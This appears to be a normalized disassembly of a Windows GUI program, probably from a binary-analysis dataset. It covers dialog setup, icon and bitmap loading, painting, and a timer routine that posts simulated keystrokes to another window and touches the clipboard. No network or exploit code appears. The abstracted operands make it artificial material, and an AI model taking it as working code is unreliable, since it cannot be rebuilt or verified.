sub_401000
push 0xffffffff
push sub_429ea8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0xa4
mov [ esp + 0x10 ] esi
call sub_41ea14
lea edi [ esi + 0x60 ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_41efc6
mov ecx [ esp + 0xc ]
mov [ edi ] r--data
mov [ esi ] r--data
mov [ esi + 0x9c ] 0x0
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_401090
push 0xffffffff
push sub_429ec8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x60 ]
mov [ esp + 0x10 ] 0x0
call sub_426127
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4010e0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x60 ]
push eax
push 0x42a
push edi
call sub_425678
add esi 0x9c
push esi
push 0x413
push edi
call sub_4255a5
pop edi
pop esi
retn 0x4
sub_401180
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0x7c ]
push 0x0
push 0x0
push 0x147
push eax
call [ SendMessageA@IAT ]
cmp eax 0x1a
mov [ esi + 0x5c ] eax
jge r-xdata
add eax 0x27
add eax 0x61
jmp r-xdata
mov ecx esi
call sub_41edb6
pop esi
retn
push 0x0
push rw-data
push rw-data
mov ecx esi
call sub_420904
pop esi
retn
mov [ esi + 0x5c ] eax
mov eax [ esi + 0x9c ]
test eax eax
jne r-xdata
sub_401230
push 0xffffffff
push sub_429f01
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push esi
push edi
mov esi ecx
push eax
push 0x94
mov [ esp + 0x14 ] esi
call sub_41ea14
lea edi [ esi + 0x64 ]
xor ebx ebx
mov ecx edi
mov [ esp + 0x18 ] ebx
call sub_41efc6
mov [ edi ] r--data
mov edx [ rw-data ]
lea ecx [ esi + 0xa4 ]
mov [ ecx ] edx
push rw-data
mov [ esp + 0x1c ] 0x2
mov [ esi ] r--data
mov [ esi + 0xa0 ] ebx
call sub_422601
mov ecx [ esp + 0x10 ]
mov [ esi + 0xa8 ] ebx
mov [ esi + 0xac ] ebx
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4012e0
push 0xffffffff
push sub_429f23
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xa4 ]
mov [ esp + 0x10 ] 0x1
call sub_422478
lea ecx [ esi + 0x64 ]
mov [ esp + 0x10 ] 0x0
call sub_426127
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401340
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x64 ]
push eax
push 0x3fe
push edi
call sub_425678
lea ecx [ esi + 0xa0 ]
push ecx
push 0x41c
push edi
call sub_4255a5
lea edx [ esi + 0xa4 ]
push edx
push 0x41b
push edi
call sub_4255d4
lea eax [ esi + 0xa8 ]
push eax
push 0x414
push edi
call sub_425626
add esi 0xac
push esi
push 0x3fd
push edi
call sub_425626
pop edi
pop esi
retn 0x4
sub_4013c0
push esi
mov esi ecx
call sub_41ed51
mov [ esi + 0xa8 ] 0x1
mov [ esi + 0xac ] 0x0
mov eax [ esi + 0x80 ]
push 0x0
push 0x0
push 0x14e
push eax
call [ SendMessageA@IAT ]
push 0x0
mov ecx esi
call sub_421060
mov eax 0x1
pop esi
retn
sub_401410
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0x80 ]
push 0x0
push 0x0
push 0x147
push eax
call [ SendMessageA@IAT ]
inc eax
mov [ esi + 0x5c ] eax
mov eax [ esi + 0xa8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xa0 ]
test eax eax
jne r-xdata
mov eax [ esi + 0xa4 ]
push rw-data
push eax
call sub_41051e
add esp 0x8
test eax eax
jne r-xdata
mov ecx esi
call sub_41edb6
pop esi
retn
push 0x0
push rw-data
push rw-data
mov ecx esi
call sub_420904
pop esi
retn
push eax
push rw-data
push rw-data
mov ecx esi
call sub_420904
pop esi
retn
sub_401520
push 0xffffffff
push sub_429f4e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x9e
mov [ esp + 0x10 ] esi
call sub_41ea14
mov ecx [ rw-data ]
mov [ esp + 0x14 ] 0x0
mov [ esi + 0x60 ] ecx
lea edi [ esi + 0x64 ]
mov [ esp + 0x14 ] 0x1
mov ecx edi
call sub_41efc6
mov [ edi ] r--data
lea edi [ esi + 0xa0 ]
mov [ esp + 0x14 ] 0x2
mov ecx edi
call sub_41efc6
mov ecx [ esp + 0xc ]
mov [ edi ] r--data
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4015d0
push 0xffffffff
push sub_429f7e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xa0 ]
mov [ esp + 0x10 ] 0x2
call sub_426127
lea ecx [ esi + 0x64 ]
mov [ esp + 0x10 ] 0x1
call sub_426127
lea ecx [ esi + 0x60 ]
mov [ esp + 0x10 ] 0x0
call sub_422478
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401640
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x64 ]
push eax
push 0x429
push edi
call sub_425678
add esi 0xa0
push esi
push 0x3fd
push edi
call sub_425678
pop edi
pop esi
retn 0x4
sub_401680
push esi
push edi
mov esi ecx
call sub_41ed51
mov eax [ esi + 0xbc ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x14e
push eax
call edi
mov ecx [ esi + 0x80 ]
push 0x0
push 0x0
push 0x14e
push ecx
call edi
pop edi
mov eax 0x1
pop esi
retn
sub_4016c0
push esi
mov esi ecx
push edi
mov edi [ SendMessageA@IAT ]
mov eax [ esi + 0xbc ]
push 0x0
push 0x0
push 0x147
push eax
call edi
sub eax 0x0
je r-xdata
push rw-data
dec eax
je r-xdata
push rw-data
jmp r-xdata
dec eax
jne r-xdata
lea ecx [ esi + 0x60 ]
call sub_422601
mov ecx [ esi + 0x80 ]
push 0x0
push 0x0
push 0x147
push ecx
call edi
mov ecx esi
mov [ esi + 0x5c ] eax
call sub_41edb6
pop edi
pop esi
retn
push rw-data
jmp r-xdata
sub_4017d0
push 0xffffffff
push sub_429fc7
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x180
push 0x0
lea ecx [ esp + 0x4 ]
call sub_405070
lea ecx [ esp ]
mov [ esp + 0x188 ] 0x0
call sub_41eac9
lea ecx [ esp + 0x110 ]
mov [ esp + 0x188 ] 0x4
call sub_426127
lea ecx [ esp + 0xd4 ]
mov [ esp + 0x188 ] 0x3
call sub_426127
lea ecx [ esp + 0x98 ]
mov [ esp + 0x188 ] 0x2
call sub_426127
lea ecx [ esp + 0x5c ]
mov [ esp + 0x188 ] 0x1
call sub_426127
lea ecx [ esp ]
mov [ esp + 0x188 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x180 ]
mov [ fs : 0x0 ] ecx
add esp 0x18c
retn
sub_401890
push 0xffffffff
push sub_42a00f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x3
call sub_426127
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x10 ] 0x2
call sub_426127
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_426127
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_426127
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401910
push 0xffffffff
push sub_42a04c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x11c
push 0x0
lea ecx [ esp + 0x4 ]
call sub_406da0
lea ecx [ esp ]
mov [ esp + 0x124 ] 0x0
call sub_41eac9
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x124 ] 0x3
call sub_41dd6c
lea ecx [ esp + 0x9c ]
mov [ esp + 0x124 ] 0x2
call sub_41dd6c
lea ecx [ esp + 0x60 ]
mov [ esp + 0x124 ] 0x1
call sub_426127
lea ecx [ esp ]
mov [ esp + 0x124 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x11c ]
mov [ fs : 0x0 ] ecx
add esp 0x128
retn
sub_4019b0
push 0xffffffff
push sub_42a081
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xd8 ]
mov [ esp + 0x10 ] 0x2
call sub_41dd6c
lea ecx [ esi + 0x9c ]
mov [ esp + 0x10 ] 0x1
call sub_41dd6c
lea ecx [ esi + 0x60 ]
mov [ esp + 0x10 ] 0x0
call sub_426127
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401a20
push 0xffffffff
push sub_42a0b1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xe0
push 0x0
lea ecx [ esp + 0x4 ]
call sub_405cc0
lea ecx [ esp ]
mov [ esp + 0xe8 ] 0x0
call sub_41eac9
lea ecx [ esp + 0x98 ]
mov [ esp + 0xe8 ] 0x2
call sub_41dd6c
lea ecx [ esp + 0x5c ]
mov [ esp + 0xe8 ] 0x1
call sub_426127
lea ecx [ esp ]
mov [ esp + 0xe8 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0xe0 ]
mov [ fs : 0x0 ] ecx
add esp 0xec
retn
sub_401ab0
push 0xffffffff
push sub_42a0d3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_41dd6c
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_426127
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401b10
push 0xffffffff
push sub_42a0f6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xa0
push 0x0
lea ecx [ esp + 0x4 ]
call sub_407aa0
lea ecx [ esp ]
mov [ esp + 0xa8 ] 0x0
call sub_41eac9
lea ecx [ esp + 0x5c ]
mov [ esp + 0xa8 ] 0x1
call sub_41dd6c
lea ecx [ esp ]
mov [ esp + 0xa8 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0xa0 ]
mov [ fs : 0x0 ] ecx
add esp 0xac
retn
sub_401b90
push 0xffffffff
push sub_42a108
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_41dd6c
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401be0
push 0xffffffff
push sub_42a13e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xa4
push 0x0
lea ecx [ esp + 0x4 ]
call sub_408420
lea ecx [ esp ]
mov [ esp + 0xac ] 0x0
call sub_41eac9
lea ecx [ esp + 0x98 ]
mov [ esp + 0xac ] 0x2
call sub_422478
lea ecx [ esp + 0x5c ]
mov [ esp + 0xac ] 0x1
call sub_426127
lea ecx [ esp ]
mov [ esp + 0xac ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0xa4 ]
mov [ fs : 0x0 ] ecx
add esp 0xb0
retn
sub_401c70
push 0xffffffff
push sub_42a163
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_422478
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_426127
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401d70
push 0xffffffff
push sub_42a241
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1fc
push esi
mov esi ecx
push 0x0
call sub_408b96
add esp 0x4
mov ecx esi
call sub_426f6e
push rw-data
mov ecx esi
call sub_426cdc
push 0x0
lea ecx [ esp + 0xc ]
call sub_402240
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0x8 ]
mov [ esp + 0x208 ] 0x0
mov [ esi + 0x1c ] eax
call sub_41eac9
lea ecx [ esp + 0x1c0 ]
mov [ esp + 0x208 ] 0xc
call sub_4260be
lea ecx [ esp + 0x184 ]
mov [ esp + 0x208 ] 0xb
call sub_4260be
lea ecx [ esp + 0x148 ]
mov [ esp + 0x208 ] 0xa
call sub_4260be
lea ecx [ esp + 0x10c ]
mov [ esp + 0x208 ] 0x9
call sub_4260be
lea ecx [ esp + 0xd0 ]
mov [ esp + 0x208 ] 0x8
call sub_4260be
lea ecx [ esp + 0x94 ]
mov [ esp + 0x208 ] 0x7
call sub_4260be
lea ecx [ esp + 0x8c ]
mov esi r--data
mov [ esp + 0x4 ] ecx
mov [ esp + 0x8c ] esi
lea ecx [ esp + 0x8c ]
mov [ esp + 0x208 ] 0xd
call sub_424e5d
lea edx [ esp + 0x84 ]
mov [ esp + 0x84 ] esi
mov [ esp + 0x4 ] edx
lea ecx [ esp + 0x84 ]
mov [ esp + 0x208 ] 0xe
call sub_424e5d
lea eax [ esp + 0x7c ]
mov [ esp + 0x7c ] esi
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x7c ]
mov [ esp + 0x208 ] 0xf
call sub_424e5d
lea ecx [ esp + 0x74 ]
mov [ esp + 0x74 ] esi
mov [ esp + 0x4 ] ecx
lea ecx [ esp + 0x74 ]
mov [ esp + 0x208 ] 0x10
call sub_424e5d
lea edx [ esp + 0x6c ]
mov [ esp + 0x6c ] esi
mov [ esp + 0x4 ] edx
lea ecx [ esp + 0x6c ]
mov [ esp + 0x208 ] 0x11
call sub_424e5d
lea eax [ esp + 0x64 ]
mov [ esp + 0x64 ] esi
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x64 ]
mov [ esp + 0x208 ] 0x12
call sub_424e5d
lea ecx [ esp + 0x8 ]
mov [ esp + 0x208 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x200 ]
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x208
retn
sub_401f40
push 0xffffffff
push sub_42a313
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x1b8 ]
mov [ esp + 0x14 ] 0xb
call sub_4260be
lea ecx [ esi + 0x17c ]
mov [ esp + 0x14 ] 0xa
call sub_4260be
lea ecx [ esi + 0x140 ]
mov [ esp + 0x14 ] 0x9
call sub_4260be
lea ecx [ esi + 0x104 ]
mov [ esp + 0x14 ] 0x8
call sub_4260be
lea ecx [ esi + 0xc8 ]
mov [ esp + 0x14 ] 0x7
call sub_4260be
lea ecx [ esi + 0x8c ]
mov [ esp + 0x14 ] 0x6
call sub_4260be
lea ecx [ esi + 0x84 ]
mov [ esp + 0x8 ] ecx
mov [ ecx ] r--data
mov [ esp + 0x14 ] 0xc
call sub_424e5d
lea ecx [ esi + 0x7c ]
mov [ esp + 0x8 ] ecx
mov [ ecx ] r--data
mov [ esp + 0x14 ] 0xd
call sub_424e5d
lea ecx [ esi + 0x74 ]
mov [ esp + 0x8 ] ecx
mov [ ecx ] r--data
mov [ esp + 0x14 ] 0xe
call sub_424e5d
lea ecx [ esi + 0x6c ]
mov [ esp + 0x8 ] ecx
mov [ ecx ] r--data
mov [ esp + 0x14 ] 0xf
call sub_424e5d
lea ecx [ esi + 0x64 ]
mov [ esp + 0x8 ] ecx
mov [ ecx ] r--data
mov [ esp + 0x14 ] 0x10
call sub_424e5d
lea ecx [ esi + 0x5c ]
mov [ esp + 0x8 ] ecx
mov [ ecx ] r--data
mov [ esp + 0x14 ] 0x11
call sub_424e5d
mov ecx esi
mov [ esp + 0x14 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_4020a0
push 0xffffffff
push sub_42a328
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0x0
call sub_424e5d
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4020e0
push 0xffffffff
push sub_42a348
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0x0
call sub_424e5d
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_402240
push 0xffffffff
push sub_42a401
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push esi
push edi
mov esi ecx
push eax
push 0x66
mov [ esp + 0x14 ] esi
call sub_41ea14
xor ebx ebx
mov [ esi + 0x5c ] r--data
mov [ esp + 0x18 ] ebx
mov [ esi + 0x60 ] ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x64 ] r--data
lea edi [ esi + 0x6c ]
mov [ esp + 0x18 ] 0x2
mov ecx edi
call sub_404a90
mov [ edi ] r--data
lea edi [ esi + 0x74 ]
mov [ esp + 0x18 ] 0x3
mov ecx edi
call sub_404a90
mov [ edi ] r--data
lea edi [ esi + 0x7c ]
mov [ esp + 0x18 ] 0x4
mov ecx edi
call sub_404a90
mov [ edi ] r--data
mov [ esi + 0x88 ] ebx
mov [ esi + 0x84 ] r--data
lea edi [ esi + 0x8c ]
mov [ esp + 0x18 ] 0x6
mov ecx edi
call sub_41efc6
mov [ edi ] r--data
lea edi [ esi + 0xc8 ]
mov [ esp + 0x18 ] 0x7
mov ecx edi
call sub_41efc6
mov [ edi ] r--data
lea edi [ esi + 0x104 ]
mov [ esp + 0x18 ] 0x8
mov ecx edi
call sub_41efc6
mov [ edi ] r--data
lea edi [ esi + 0x140 ]
mov [ esp + 0x18 ] 0x9
mov ecx edi
call sub_41efc6
mov [ edi ] r--data
lea edi [ esi + 0x17c ]
mov [ esp + 0x18 ] 0xa
mov ecx edi
call sub_41efc6
mov [ edi ] r--data
lea edi [ esi + 0x1b8 ]
mov [ esp + 0x18 ] 0xb
mov ecx edi
call sub_41efc6
mov [ edi ] r--data
mov [ esp + 0x18 ] 0xc
mov [ esi ] r--data
call sub_4272f7
call sub_4272f7
mov eax [ eax + 0xc ]
push 0x80
push eax
call [ LoadIconA@IAT ]
mov ecx [ esp + 0x10 ]
mov [ esi + 0x1f4 ] eax
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4023d0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x8c ]
push eax
push 0x3fd
push edi
call sub_425678
lea ecx [ esi + 0xc8 ]
push ecx
push 0x3fb
push edi
call sub_425678
lea edx [ esi + 0x104 ]
push edx
push 0x401
push edi
call sub_425678
lea eax [ esi + 0x140 ]
push eax
push 0x400
push edi
call sub_425678
lea ecx [ esi + 0x17c ]
push ecx
push 0x3ff
push edi
call sub_425678
add esi 0x1b8
push esi
push 0x3fe
push edi
call sub_425678
pop edi
pop esi
retn 0x4
sub_402460
push ebx
push ebp
push esi
push edi
mov esi ecx
call sub_41ed51
mov eax [ esi + 0x1f4 ]
mov ecx [ esi + 0x1c ]
mov edi [ SendMessageA@IAT ]
push eax
push 0x1
push 0x80
push ecx
call edi
mov edx [ esi + 0x1f4 ]
mov eax [ esi + 0x1c ]
push edx
push 0x0
push 0x80
push eax
call edi
call sub_4272f7
mov eax [ eax + 0xc ]
mov ebx [ LoadBitmapA@IAT ]
push 0x91
push eax
lea ebp [ esi + 0x5c ]
call ebx
push eax
mov ecx ebp
call sub_424e06
test ebp ebp
je r-xdata
mov ecx [ esi + 0xe4 ]
push ebp
push 0x0
push 0xf7
push ecx
call edi
call sub_4272f7
mov eax [ eax + 0xc ]
push 0x8c
push eax
lea ebp [ esi + 0x64 ]
call ebx
push eax
mov ecx ebp
call sub_424e06
test ebp ebp
je r-xdata
mov ebp [ ebp + 0x4 ]
mov edx [ esi + 0xa8 ]
push ebp
push 0x0
push 0xf7
push edx
call edi
call sub_4272f7
mov eax [ eax + 0xc ]
push 0x8d
push eax
lea ebp [ esi + 0x6c ]
call ebx
push eax
mov ecx ebp
call sub_424e06
test ebp ebp
je r-xdata
mov ebp [ ebp + 0x4 ]
mov eax [ esi + 0x1d4 ]
push ebp
push 0x0
push 0xf7
push eax
call edi
call sub_4272f7
mov eax [ eax + 0xc ]
push 0x8e
push eax
lea ebp [ esi + 0x74 ]
call ebx
push eax
mov ecx ebp
call sub_424e06
test ebp ebp
je r-xdata
mov ebp [ ebp + 0x4 ]
mov ecx [ esi + 0x198 ]
push ebp
push 0x0
push 0xf7
push ecx
call edi
call sub_4272f7
mov eax [ eax + 0xc ]
push 0x8f
push eax
lea ebp [ esi + 0x7c ]
call ebx
push eax
mov ecx ebp
call sub_424e06
test ebp ebp
je r-xdata
mov ebp [ ebp + 0x4 ]
mov edx [ esi + 0x15c ]
push ebp
push 0x0
push 0xf7
push edx
call edi
call sub_4272f7
mov eax [ eax + 0xc ]
push 0x90
push eax
lea ebp [ esi + 0x84 ]
call ebx
push eax
mov ecx ebp
call sub_424e06
test ebp ebp
je r-xdata
mov ebp [ ebp + 0x4 ]
mov eax [ esi + 0x120 ]
push ebp
push 0x0
push 0xf7
push eax
call edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ebp [ ebp + 0x4 ]
sub_4025e0
sub esp 0x64
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
push eax
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov ecx esi
call sub_41f34e
pop esi
add esp 0x64
retn
push ebx
push edi
push esi
lea ecx [ esp + 0x20 ]
call sub_424cc6
mov edi [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
mov ecx [ esi + 0x1c ]
push 0x0
neg eax
sbb eax eax
and eax edi
push eax
push 0x27
push ecx
call [ SendMessageA@IAT ]
mov edi [ GetSystemMetrics@IAT ]
push 0xb
call edi
push 0xc
mov ebx eax
call edi
mov edi eax
mov eax [ esi + 0x1c ]
lea edx [ esp + 0xc ]
push edx
push eax
call [ GetClientRect@IAT ]
mov ecx [ esi + 0x1f4 ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
sub eax ecx
sub eax edi
inc eax
cdq
sub eax edx
mov edx [ esp + 0x10 ]
sar eax 0x1
push eax
mov eax [ esp + 0x1c ]
sub eax edx
sub eax ebx
inc eax
cdq
sub eax edx
mov edx [ esp + 0x28 ]
sar eax 0x1
push eax
push edx
call [ DrawIcon@IAT ]
lea ecx [ esp + 0x1c ]
call sub_424d38
pop edi
pop ebx
pop esi
add esp 0x64
retn
sub_4026b0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42a418
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x1c
test eax eax
push esi
je r-xdata
mov ecx [ esp + 0x20 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x14
mov eax [ rw-data ]
inc eax
cmp eax 0xa
mov [ rw-data ] eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x0
push ebx
push ebp
lea ecx [ eax * 8 ]
push edi
sub ecx eax
mov edx [ ecx * 4 + rw-data ]
lea esi [ ecx * 4 + rw-data ]
mov [ rw-data ] edx
mov eax [ esi + 0x4 ]
mov [ rw-data ] eax
mov ecx [ esi + 0x8 ]
mov [ rw-data ] ecx
mov edx [ esi + 0xc ]
lea eax [ esi + 0x10 ]
mov ecx rw-data
push eax
mov [ rw-data ] edx
call sub_4225b1
mov ecx [ esi + 0x14 ]
mov eax [ rw-data ]
mov [ rw-data ] ecx
mov edx [ esi + 0x18 ]
test eax eax
mov [ rw-data ] edx
jg r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
cmp ecx eax
jg r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov ebx [ PostMessageA@IAT ]
cmp eax 0xa
jne r-xdata
add [ rw-data ] 0x64
mov eax [ rw-data ]
lea edx [ eax * 8 ]
sub edx eax
mov eax [ edx * 4 + rw-data ]
test eax eax
jle r-xdata
lea eax [ edx * 8 ]
sub eax edx
mov esi [ eax * 4 + rw-data ]
lea eax [ eax * 4 + rw-data ]
dec esi
mov [ eax ] esi
lea eax [ edx + 0x1 ]
cdq
mov esi 0x186a0
idiv esi
cmp edx ecx
jne r-xdata
cmp [ rw-data ] 0x14
jne r-xdata
mov eax [ rw-data ]
push 0x0
push 0x10
push 0x100
mov ecx [ eax + 0x1c ]
push ecx
call ebx
mov edx [ rw-data ]
push 0x0
push 0x5a
push 0x100
mov eax [ edx + 0x1c ]
push eax
call ebx
mov ecx [ rw-data ]
push 0x0
push 0x5a
push 0x101
mov edx [ ecx + 0x1c ]
push edx
call ebx
mov eax [ rw-data ]
push 0x0
push 0x10
push 0x101
mov ecx [ eax + 0x1c ]
push ecx
call ebx
mov eax [ rw-data ]
push 0x0
test eax eax
jg r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
pop esi
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x14
cmp [ rw-data ] 0x1e
jne r-xdata
call [ EmptyClipboard@IAT ]
mov eax [ rw-data ]
push eax
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push eax
push 0x100
mov edx [ ecx + 0x1c ]
push edx
call ebx
mov ecx [ rw-data ]
mov eax [ rw-data ]
push 0x0
push eax
mov edx [ ecx + 0x1c ]
push 0x101
push edx
mov edx [ rw-data ]
push 0x10
push 0x100
mov eax [ edx + 0x1c ]
push eax
call ebx
mov eax [ rw-data ]
mov ecx [ rw-data ]
neg eax
mov edx [ ecx + 0x1c ]
push 0x0
push eax
push 0x100
push edx
call ebx
mov eax [ rw-data ]
push 0x0
neg eax
push eax
mov eax [ rw-data ]
push 0x101
mov ecx [ eax + 0x1c ]
push ecx
call ebx
mov edx [ rw-data ]
push 0x0
push 0x10
push 0x101
mov eax [ edx + 0x1c ]
push eax
jmp r-xdata
mov edx [ rw-data ]
mov esi [ SendMessageA@IAT ]
push 0x0
push 0x20
mov eax [ edx + 0x1c ]
push 0x100
push eax
call esi
mov ecx [ rw-data ]
push 0x0
push 0x20
push 0x101
mov edx [ ecx + 0x1c ]
push edx
call esi
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
pop esi
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x14
mov eax [ rw-data ]
mov esi [ PostMessageA@IAT ]
test eax eax
mov eax [ rw-data ]
push 0x0
push 0x10
push 0x100
mov ecx [ eax + 0x1c ]
push ecx
jg r-xdata
cmp [ rw-data ] 0x28
jne r-xdata
mov edx [ rw-data ]
push 0x0
push 0x12
push 0x100
mov eax [ edx + 0x1c ]
push eax
call ebx
mov edx [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push ecx
mov eax [ edx + 0x1c ]
push 0x100
push eax
call ebx
mov ecx [ rw-data ]
push 0x0
push 0x12
push 0x101
mov edx [ ecx + 0x1c ]
push edx
call ebx
mov ecx [ rw-data ]
mov eax [ rw-data ]
push 0x0
push eax
mov edx [ ecx + 0x1c ]
push 0x101
push edx
call ebx
mov ecx [ rw-data ]
push 0x0
push 0xde
push 0x100
mov edx [ ecx + 0x1c ]
push edx
call ebx
mov eax [ rw-data ]
push 0x0
push 0xde
push 0x101
mov ecx [ eax + 0x1c ]
push ecx
call ebx
